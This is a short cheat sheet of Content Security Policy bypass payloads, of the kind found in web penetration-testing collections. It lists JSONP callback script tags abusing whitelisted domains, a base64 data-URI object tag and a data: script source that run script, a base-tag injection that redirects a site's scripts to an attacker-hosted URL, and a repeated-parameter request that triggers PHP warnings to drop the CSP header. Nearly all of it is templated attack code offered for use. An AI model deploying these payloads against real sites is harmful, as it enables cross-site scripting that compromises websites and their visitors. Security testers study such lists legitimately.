### CSP Bypass Techniques

**JSONP Endpoint Bypass:**
```html
<!-- Replace {WHITELISTED_DOMAIN} with domain allowed in CSP -->
<script src=//{WHITELISTED_DOMAIN}/complete/search?client=chrome%26jsonp={PAYLOAD};>
<script src=//{WHITELISTED_DOMAIN}/o/oauth2/revoke?callback={PAYLOAD}>
<script src=//{WHITELISTED_DOMAIN}/$discovery/rest?version=v3&callback={PAYLOAD};>
```

**script-src 'self' Bypass:**
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

**script-src 'self' data: Bypass:**
```html
<script src="data:,alert(1)"></script>
```

**Nonce Bypass (Base Tag Injection):**
```html
<base href=http://{ATTACKER_URL}>
<!-- Then host malicious JS at same path as legitimate script on target -->
<!-- Example: If target has /js/app.js, host your payload at http://{ATTACKER_URL}/js/app.js -->
```

**PHP Header Bypass:**
Generate PHP warning to prevent CSP header:
```
GET /?xss=<script>alert(1)</script>&a&a&a...[REPEATED 1000 times]
```

